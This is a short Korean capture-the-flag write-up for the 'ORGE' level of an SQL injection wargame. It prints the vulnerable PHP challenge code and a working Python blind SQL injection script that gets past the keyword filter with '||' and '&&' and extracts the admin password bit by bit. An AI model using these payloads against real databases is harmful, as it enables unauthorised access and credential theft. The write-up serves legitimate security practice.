
## ORGE Write-up

### 문제
``` php
<?php  
include "./config.php";  
login_chk();  
dbconnect();  
if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");  
if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe");  
$query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'";  
echo "<hr>query : <strong>{$query}</strong><hr><br>";  
$result = @mysql_fetch_array(mysql_query($query));  
if($result['id']) echo "<h2>Hello {$result[id]}</h2>";  
  
$_GET[pw] = addslashes($_GET[pw]);  
$query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'";  
$result = @mysql_fetch_array(mysql_query($query));  
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge");  
highlight_file(__FILE__);  
?>
```

### Exploit 코드
``` python
import requests

def req(a) :
    url = 'https://los.rubiya.kr/orge_bad2f25db233a7542be75844e314e9f3.php'
    cookies = {'PHPSESSID' : 'My PHPSESSID'}
    params = {}
    params['pw'] = a

    res = requests.get(url, cookies=cookies, params=params)

    if "Hello admin" in res.text :
        return True
    elif "Clear" in res.text :
        return True
    else :
        return False

length = 0
for i in range(20) :
    a = "'||id='admin'&&length(pw)='" + str(i)
    if req(a) :
        length = i
        print("Key length is %d" % length)
        break
    
flag = ""
for i in range(length) :
    binary = ""
    for j in range(8) :
        a = "'||id='admin'&&substr(lpad(bin(ascii(substr(pw, " + str(i+1) + ", 1))), 8, 0)," + str(j+1) + ", 1)=0#"
        if req(a) :
            binary += "0"
        else :
            binary += "1"
    flag += chr(int(binary, 2))
    print("[%d] %s" % (i+1, flag))

if req(flag) :
    print("FLAG IS " + flag)
    print("[♪] ORGE Clear")
    

```

이번 문제는 admin의 pw를 알아내야 하는 문제다.  
``` python
a = "'||id='admin'&&substr(lpad(bin(ascii(substr(pw, " + str(i+1) + ", 1))), 8, 0)," + str(j+1) + ", 1)=0#"
```
코드에서 보면 pw를 한글자씩 가져와 ascii로 변환한 값을 바이너리로 변환한다. 그리고 그 값을 포함한 8자리의 왼쪽은 0으로 채우고, 그 값을 한글자씩 가져와 비교한다.  
원래 ascii() 함수가 아닌 ord() 함수를 썼는데 or이 필터링 되어 있어서 ascii로 바꿔주었다.  
flag가 나오고 문제가 풀린다.